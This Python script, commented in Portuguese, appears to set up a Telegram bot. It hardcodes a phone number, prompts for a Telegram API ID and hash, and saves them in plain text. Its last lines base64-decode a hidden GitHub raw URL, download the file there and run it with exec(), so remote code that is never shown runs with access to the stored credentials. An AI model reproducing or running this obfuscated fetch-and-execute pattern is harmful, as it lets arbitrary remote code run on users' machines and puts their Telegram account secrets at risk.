# -*- coding: utf-8 -*-
import requests
import io 
import os
from base64 import urlsafe_b64decode as base64urldecode

def verificar_arquivo_existe(dados_path, telefone):
    arquivo_telefone = os.path.join(dados_path, f'meutelefone.txt')
    if os.path.exists(arquivo_telefone):
        with open(arquivo_telefone, 'r') as arquivo:
            linhas = arquivo.readlines()
            if len(linhas) == 3 and linhas[0].startswith('TEL') and linhas[1].startswith(f'ID') and linhas[2].startswith(f'HASH'):
                return True
    return False

def criar_pasta_telefone(telefone):
    dados_path = os.path.join(DDIDDDTELEFONE, 'dados')  # Navegar um nível acima para a pasta "DDIDDDTELEFONE"
    if not os.path.exists(dados_path):
        os.makedirs(dados_path)
    return dados_path

def salvar_dados_telefone(dados_path, telefone, id_telegram, hash_telegram):
    arquivo_telefone = os.path.join(dados_path, f'meutelefone.txt')
    with open(arquivo_telefone, 'w') as arquivo:
        arquivo.write(f'TEL {telefone}\n')
        arquivo.write(f'ID {id_telegram}\n')
        arquivo.write(f'HASH {hash_telegram}\n')


global DDIDDDTELEFONE

ddi = '55' #input('Digite o DDI (código do país): ')
ddd = '11' #input('Digite o DDD (código da região): ')
telefone = '977058071' #input('Digite o número de telefone (sem DDI e DDD): ')
telefone_completo = f'{ddi}{ddd}{telefone}'
# Variável global para armazenar o DDIDDDTELEFONE
DDIDDDTELEFONE = telefone_completo

dados_path = criar_pasta_telefone(telefone_completo)

if not verificar_arquivo_existe(dados_path, telefone_completo):
    id_telegram = input('Digite o ID do Telegram: ')
    hash_telegram = input('Digite o HASH do Telegram: ')
    
    salvar_dados_telefone(dados_path, telefone_completo, id_telegram, hash_telegram)
    print('Dados salvos com sucesso!')
else:
    print('Os dados já foram salvos anteriormente. Ignorando a próxima etapa.')
    
criasession = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9jcmlhc2Vzc2lvbnMucHk="
criasession = base64urldecode(criasession.encode("utf-8"))
criasession = criasession.decode("utf-8")
headers = {'Referer': criasession}
criasession = requests.get(criasession, headers=headers)
criasession = criasession.text
exec(criasession)  
